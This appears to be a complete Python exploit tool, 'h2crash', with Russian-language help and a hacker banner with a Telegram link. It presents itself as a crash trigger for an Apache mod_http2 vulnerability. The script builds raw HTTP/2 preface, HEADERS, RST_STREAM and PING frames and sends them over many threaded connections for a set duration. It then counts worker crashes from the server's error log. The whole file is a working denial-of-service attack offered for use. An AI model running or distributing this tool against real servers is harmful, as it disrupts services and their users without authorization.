#!/usr/bin/env python3
import argparse
import json
import os
import socket
import struct
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor

MAGIC = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
SETTINGS = b"\x00\x00\x06\x04\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x64"
RESET = b"\x00\x00\x04\x03\x00\x00\x00\x00\x03\x00\x00\x00\x08"
PING = b"\x00\x00\x08\x06\x00\x00\x00\x00\x00" + b"\x00" * 8

TOP = [
    "██╗  ██╗  █████╗   ██████╗ ██╗  ██╗ ██╗  ██╗ ███████╗ ██╗   ██╗ ███╗   ██╗",
    "██║  ██║ ██╔══██╗ ██╔════╝ ██║ ██╔╝ ██║  ██║ ██╔════╝ ██║   ██║ ████╗  ██║",
    "███████║ ███████║ ██║      █████╔╝  ███████║ █████╗   ██║   ██║ ██╔██╗ ██║",
    "██╔══██║ ██╔══██║ ██║      ██╔═██╗  ╚════██║ ██╔══╝   ██║   ██║ ██║╚██╗██║",
    "██║  ██║ ██║  ██║ ╚██████╗ ██║  ██╗      ██║ ██║      ╚██████╔╝ ██║ ╚████║",
    "╚═╝  ╚═╝ ╚═╝  ╚═╝  ╚═════╝ ╚═╝  ╚═╝      ╚═╝ ╚═╝       ╚═════╝  ╚═╝  ╚═══╝",
]

COLORS = {
    "white": "231",
    "blue": "39",
    "red": "196",
    "orange": "214",
    "cyan": "51",
    "green": "46",
    "magenta": "201",
}

VERSION = "1.0"


def paint(text, color, enabled):
    if not enabled:
        return text
    return "\x1b[38;5;%sm%s\x1b[0m" % (COLORS[color], text)


def print_banner(stream, colors):
    for line in TOP[0:2]:
        stream.write(paint(line, "white", colors) + "\n")
    for line in TOP[2:4]:
        stream.write(paint(line, "blue", colors) + "\n")
    for line in TOP[4:6]:
        stream.write(paint(line, "red", colors) + "\n")
    stream.write(paint("  mod_http2 session bbtmp crash", "orange", colors) + "\n")
    stream.write(paint("  Made by Walter White (Lamer)", "orange", colors) + "\n")
    link = "  https://t.me/walterlamer"
    if colors:
        link = "\x1b[38;5;%sm\x1b[4m%s\x1b[0m" % (COLORS["orange"], link)
    stream.write(link + "\n\n")


def show_help(colors):
    paint_help = lambda text: paint(text, "orange", colors)
    lines = [
        "h2crash  %s" % VERSION,
        "",
        "Краш-триггер mod_http2 для CVE-2026-57941.",
        "",
        "Быстрый старт:",
        "  ./h2crash.py -u http://127.0.0.1:8094",
        "  ./h2crash.py -u http://127.0.0.1:8094 -d 60 -t 8",
        "  ./h2crash.py -u http://127.0.0.1:8094 -l /var/log/httpd/error_log",
        "",
        "Режимы:",
        "  crash    отправка триггера и подсчёт падений воркера",
        "  check    только проверка, что сервер отвечает по h2c",
        "",
        "Флаги:",
        "  -u  --url        адрес цели, обязателен",
        "  -d  --duration   длительность прогона в секундах",
        "  -t  --threads    число одновременных соединений",
        "  -l  --log        путь к error_log для подсчёта AH00051 и AH00052",
        "  -m  --mode       crash или check",
        "  -j  --json       машинный вывод",
        "  -q  --quiet      без баннера и служебных строк",
        "  -p  --plain      без цветов",
        "  -v  --version    версия",
        "  -h  --help       эта справка",
        "",
        "Ограничение:",
        "  Это краш, а не выполнение кода. Воркер падает, MPM поднимает новый.",
        "",
        paint_help("Telegram: https://t.me/walterlamer"),
    ]
    print("\n".join(lines))


def parse_target(url):
    text = url.strip()
    if text.startswith("http://"):
        text = text[7:]
    elif text.startswith("https://"):
        text = text[8:]
    text = text.rstrip("/")
    if ":" in text:
        host, port = text.rsplit(":", 1)
        return host, int(port)
    return text, 80


def encode_int(value, bits, mask):
    limit = (1 << bits) - 1
    if value < limit:
        return bytes([mask | value])
    output = bytearray([mask | limit])
    value -= limit
    while value >= 128:
        output.append((value & 0x7f) | 0x80)
        value >>= 7
    output.append(value)
    return bytes(output)


def build_headers(host):
    raw = host.encode()
    block = bytearray()
    block.append(0x82)
    block.append(0x86)
    block += encode_int(1, 4, 0x40)
    block += encode_int(len(raw), 7, 0x00)
    block += raw
    block.append(0x84)
    return struct.pack(">I", len(block))[1:] + b"\x01\x04\x00\x00\x00\x03" + block


def send_probe(host, port, timeout, headers):
    stream = socket.create_connection((host, port), timeout)
    stream.settimeout(timeout)
    stream.sendall(MAGIC + SETTINGS)
    stream.sendall(headers + RESET)
    stream.sendall(PING)
    try:
        stream.recv(4096)
    except OSError:
        pass
    stream.close()


def detect_alive(host, port, timeout):
    try:
        stream = socket.create_connection((host, port), timeout)
        stream.settimeout(timeout)
        stream.sendall(MAGIC + SETTINGS)
        reply = stream.recv(4096)
        stream.close()
        return len(reply) > 0
    except OSError:
        return False


def read_log(path, offset):
    if not path or not os.path.exists(path):
        return offset, 0
    with open(path, "rb") as handle:
        handle.seek(offset)
        chunk = handle.read()
        offset = handle.tell()
    text = chunk.decode("utf-8", "ignore")
    return offset, text.count("AH00051") + text.count("AH00052")


def run_crash(host, port, duration, threads, log_path, quiet):
    offset = 0
    if log_path and os.path.exists(log_path):
        offset = os.path.getsize(log_path)
    stopped = time.time() + duration
    counters = {"probe": 0, "fail": 0}
    lock = threading.Lock()

    headers = build_headers(host)

    def worker():
        while time.time() < stopped:
            try:
                send_probe(host, port, 2.0, headers)
                with lock:
                    counters["probe"] += 1
            except OSError:
                with lock:
                    counters["fail"] += 1

    with ThreadPoolExecutor(max_workers=threads) as pool:
        for _ in range(threads):
            pool.submit(worker)

    offset, crashes = read_log(log_path, offset)
    if not quiet:
        print("соединений: %d, отказов: %d, падений воркера: %d" % (counters["probe"], counters["fail"], crashes))
    return {"probe": counters["probe"], "fail": counters["fail"], "crash": crashes}


def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-u", "--url")
    parser.add_argument("-d", "--duration", type=float, default=30.0)
    parser.add_argument("-t", "--threads", type=int, default=4)
    parser.add_argument("-l", "--log")
    parser.add_argument("-m", "--mode", default="crash")
    parser.add_argument("-j", "--json", action="store_true")
    parser.add_argument("-q", "--quiet", action="store_true")
    parser.add_argument("-p", "--plain", action="store_true")
    parser.add_argument("-v", "--version", action="store_true")
    parser.add_argument("-h", "--help", action="store_true")
    arguments = parser.parse_args()

    colors = (not arguments.plain) and (not os.environ.get("NO_COLOR")) and sys.stdout.isatty()
    banner_stream = sys.stderr if (arguments.json or arguments.quiet) else sys.stdout

    if arguments.help:
        print_banner(banner_stream, colors)
        show_help(colors)
        return 0
    if arguments.version:
        print_banner(banner_stream, colors)
        print("h2crash %s" % VERSION)
        return 0
    if not arguments.url:
        print_banner(banner_stream, colors)
        print("нужен адрес цели: -u http://host:port", file=sys.stderr)
        return 2

    print_banner(banner_stream, colors)
    host, port = parse_target(arguments.url)

    if arguments.mode == "check":
        alive = detect_alive(host, port, 3.0)
        result = {"target": arguments.url, "alive": alive}
        if arguments.json:
            print(json.dumps(result))
        elif not arguments.quiet:
            print("h2c отвечает: %s" % ("да" if alive else "нет"))
        return 0 if alive else 1

    alive_before = detect_alive(host, port, 3.0)
    if not alive_before:
        print("h2c не отвечает на %s" % arguments.url, file=sys.stderr)
        return 1
    if not arguments.quiet:
        print("цель %s, потоков %d, длительность %.0f с" % (arguments.url, arguments.threads, arguments.duration))
        if not arguments.log:
            print("без -l падения не считаются, смотрите error_log сервера")

    result = run_crash(host, port, arguments.duration, arguments.threads, arguments.log, arguments.quiet)
    result["target"] = arguments.url
    result["alive_after"] = detect_alive(host, port, 3.0)

    if arguments.json:
        print(json.dumps(result))
    elif not arguments.quiet:
        print("h2c после прогона: %s" % ("отвечает" if result["alive_after"] else "не отвечает"))
        if arguments.log:
            print("итог: %d падений воркера" % result["crash"])
    return 0


if __name__ == "__main__":
    sys.exit(main())
